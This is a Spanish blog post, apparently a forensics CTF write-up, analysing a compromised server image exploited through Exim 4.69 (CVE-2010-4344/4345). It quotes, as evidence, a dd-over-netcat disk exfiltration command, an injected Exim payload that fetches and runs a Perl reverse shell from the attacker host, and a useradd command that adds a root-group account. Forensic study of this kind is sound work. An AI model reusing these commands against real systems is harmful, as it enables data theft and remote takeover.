---
layout: post
title:  "La vulnerabilidad que abrió la puerta"
author: erik
categories: [ CTF ]
image: https://user-images.githubusercontent.com/47476901/151602088-45f0ad15-b610-45f7-b935-c8e1664fe8d3.png
beforetoc: ""
toc: false
tags: [ CTF, Intrusion, CVE, BufferOverflow, SMTP ]
---
Reto de ctf sobre una intrusion a un sistema

#### Descripcion:

  Un conocido nos ha facilitado una imagen de disco de un servidor que considera
            “está haciendo cosas raras”.
  Desde el laboratorio de INCIBE hemos visto que había
            “algo raro” con algún programa.
  Necesitamos una segunda opinión de un experto. 

#### ¿Nos ayudas a identificar la aplicación vulnerable?
- File: DiscoS.zip
- Contraseña:  Gr33n2015## 

---

# Table of Contents
1. [Extrayendo el zip](#extraerzip)
2. [Montar la imagen](#montarimg)
3. [Analizar historial comandos](#analizarcomandos)
4. [Analizando aplicacion maliciosa](#appmaliciosa)
5. [Logs corruptos](#logscorruptos)


---
<a name="extraerzip"></a>
### 1- Extrayendo el zip
Descargamos DiscoS.zip y lo extraemos usando la contraseña que nos ofrecen

```bash
unzip discoS.zip
```
![unzip](https://user-images.githubusercontent.com/47476901/151601581-c8a5e5b8-d5ca-48f0-bed3-784c8587ee69.png)

<a name="montarimg"></a>
### 2- Montar la imagen
Nos extrae una imagen, montaremos esta imagen en una carpeta para ver lo que contiene.

```bash
mkdir disco
sudo mount discoS.img disco
```
![mount](https://user-images.githubusercontent.com/47476901/151601607-9c2dfb92-f96d-4793-b7d6-42c71a9af47a.png)

<a name="analizarcomandos"></a>
### 3- Analizar historial comandos
Anteriormente nos indicaron que esta imagen del sistema tiene algo raro, puede que sea algo malicioso, para ello comprobaremos si accedieron al usuario root y si es así que podamos ver que comandos ejecutaron como usuario administrador.

```bash
cat root/.bash_history
```
![bash_history](https://user-images.githubusercontent.com/47476901/151601626-071bcd58-4727-430e-b672-ae151a8816f6.png)

### ¿Que hizo el atacante como administrador?
<br>
**1- Elimina el programa exim del sistema**

```bash
apt-get remove exim4
apt-get remove exim4-base
apt-get remove exim4-daemon-light
dpkg -l | grep exim
apt-get remove exim4-config
dpkg --purge
apt-get remove exim
dpkg -l | grep exim
```

**2- Comprueba en que ruta se encuentra, crea una carpeta llamada exim4 y la abre.**

```bash
pwd
mkdir exim4
cd exim4/
```

**3- Con el comando scp copia todos los archivos mediante ssh del host del atacante en la nueva carpeta**

```bash
scp yom@192.168.56.1:/home/yom/temporary/exim4/* .
```

**4- Instala los paquetes vulnerables de exim que se descargó desde su maquina remotamente.**

<li>Esta version de Exim tiene una vulnerabilidad critica</li>
<li>Exim 4.69 Remote Code Execution via Buffer overflow (Desbordar la memoria)</li>

```bash
dpkg -i exim4_4.69-9_all.deb 
dpkg -i --ignore-depends=exim4-base,exim4-daemon-light exim4_4.69-9_all.deb 
dpkg -i exim4-base_4.69-9_i386.deb 
dpkg -i exim4-config_4.69-9_all.deb 
dpkg -i exim4-base_4.69-9_i386.deb 
dpkg -i exim4-daemon-light_4.69-9_i386.deb 
```

**5- Una vez instalados todos los paquetes vulnerables, sale de la carpeta y la elimina.**

```bash
cd ..
rm -rf exim4/
```

**6- Detiene todos las operaciones de la CPU con el comando halt.**

<li>Se usa para indicar al hardware que detenga todas las funciones de la CPU.</li>

<li>Es decir, reinicia o detiene el sistema</li>


**7- Instala el programa OpenSSH cifra las conexiones a traves de la red. (alternativa al SSH)**
```bash
apt-get install openssh-server
apt-get install openssh-server
```

**8- Configura el servidor de correo vulnerable y reinicia el sistema.**

```bash
cd /etc/exim4/
ls
vi update-exim4.conf.conf 
update-exim4.conf
halt
reboot
```

**9- Busca las rutas de los binarios gcc, memdump.**
<li>No tiene el binario memdump instalado, lo instala</li>
<li>memdump hace un volcado de memoria</li>
<li>gcc es un compilador</li>

```bash
whereis gcc
whereis memdump
apt-get install memdump
halt
```

**10- Comprueba si tiene conexion con su maquina dentro de la red**

```bash
ifconfig 
ping 192.168.56.1
```

**11- Robando datos**
<li>El comando dd es una herramienta muy poderosa, limpia, verifica, destruye, duplica datos.</li>
<li>Copió la partición a traves de una conexion usando netcat</li>
<li>Lo que hizo fue que todo el contenido de la particion se mandase a traves de esa conexion.</li>
<li>El atacante ubicado en la 192.168.56.1 se puso a la escucha por ese puerto desde su maquina y redirigió todo ese output a su maquina haciendo asi una copia de particiones a traves de la red.</li>

```bash
mount
sudo dd if=/dev/sda | nc 192.168.56.1 4444
dd if=/dev/sda | nc 192.168.56.1 4444
dd if=/dev/sda1 | nc 192.168.56.1 4444
```

**12- Recuperando los datos transferidos.**
<li>El atacante instala 2 herramientas forenses para recuperar datos de esas particiones que se hayan podido volver corruptos.</li>

```bash
apt-get install ddrescue
apt-get install dcfldd
```
<br>
<a name="appmaliciosa"></a>
### 4- Analizando aplicacion maliciosa

Ya hemos visto que la aplicacion maliciosa es exim, un servicio de transferencia de correo.

La version 4.69 de Exim contiene una vulnerabilidad critica.

Descubierta en 2011, fue una de las principales causas de botnets de ese momento.

Al enviar un mensaje especialmente diseñado, un atacante puede corromper el heap y ejecutar código arbitrario con los privilegios del usuario Exim (CVE-2010-4344) causando el buffer overflow (desbordamiento de la memoria).


<li>También se utilizó una vulnerabilidad adicional, (CVE-2010-4345), este fue el ataque que condujo al descubrimiento de que habia un intruso en el sistema.</li>

<li>Este error permite que un usuario local obtenga privilegios de root desde la cuenta de Exim (cuenta que corre el servicio de correos). </li>

<li>Si el intérprete de Perl se encuentra en el sistema remoto la explotacion se realizará, este módulo también explotará automáticamente el error secundario para obtener el root.</li>

Por eso este fallo del sistema fue tan grave, juntando asi un RCE y un LPE causando tal desastre. 
<br><br>
<b> - RCE: CVE-2010-4344</b><br>
<b> - LPE: CVE-2010-4345</b> 

Exploits y mas info: <a href="https://eromang.zataz.com/2010/12/20/exim-4-69-remote-code-execution/" target="_blank">EXIM 4.69 RCE</a>

Dejo un video de como se explota este fallo de seguridad, usando un modulo de metasploit:
<a href="https://www.youtube.com/watch?v=DnSgOGIxjaQ" target="_blank">https://www.youtube.com/watch?v=DnSgOGIxjaQ</a>
<br>
<a name="logscorruptos"></a>
### 5- Logs corruptos
Una vez conocemos como ha ocurrido todo esto observamos los logs, que fue la principal fuente de explotacion.

```bash
ls var/log/exim4
```

![logs](https://user-images.githubusercontent.com/47476901/151601664-c6e7360c-2345-47f4-b930-6209ed152a45.png)


Buffer Overflow log:

```bash
cat var/log/exim4/rejectlog
```

![BufferOverflow](https://user-images.githubusercontent.com/47476901/151601700-7197f48d-cdb2-4418-9454-f7170a103ef7.png)

Intentaba descargar el archivo realizando el desbordamiento y una de las peticiones fue realizada correctamente, una vez se descargó el archivo perl de su maquina de atacante, lo ubicaba en tmp como usuario exim y lo ejecutó como ese usuario.

```bash
cat var/log/exim4/mainlog
```

Este binario perl realiza una conexion por sockets creando asi una sesion remota del ordenador victima al atacante.

```bash
${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'"}}
```
![perlreverse](https://user-images.githubusercontent.com/47476901/151601733-346e564f-5970-4da6-aeb8-1daae6426961.png)


Exploit de perl que realiza una reverse shell al ordenador (exploit que se ejecuta en exim para conectarse al ordenador remotamente como usuario root):

<li>Este es el Remote Code Execution</li>
<b> La forma en la que se conectó el atacante</b>

![binarioperl](https://user-images.githubusercontent.com/47476901/151601751-a0c87d38-57af-4380-8b27-d8626a8fbc3c.png)

```bash
cat var/log/exim4/mainlog
```
      
Crea un nuevo usuario que este en el grupo de administador con una contraseña hasheada en md5.

<li> Este es el Local Privilege Escalation<br></li>
**La forma en la que se convierte en root**

```bash
${run{/bin/sh -c "exec /bin/sh -c 'useradd --gid root --create-home --password  0 0mkpasswd -H md5 Ulyss3s) ulysses'"}} 
```

![crearusuario](https://user-images.githubusercontent.com/47476901/151601768-cab31bd9-4515-4174-bcf1-7ec1df3979df.png)


En tmp podemos observar como esta el fichero <b>c.perl</b> (el cual generaba esa conexion),
y un archivo comprimido llamado <b>rk.tar</b>

![tmpfiles](https://user-images.githubusercontent.com/47476901/151601785-d6662d80-4c74-4a1a-9d95-ded5142f1266.png)


Analizando el archivo rk, nos damos cuenta de que se trata de un rootkit, el cual genera una puerta trasera al sistema usando iptables y demas cosas.

![rootkit](https://user-images.githubusercontent.com/47476901/151602060-d4c88931-3218-4611-8a43-ff6eddf33892.png)
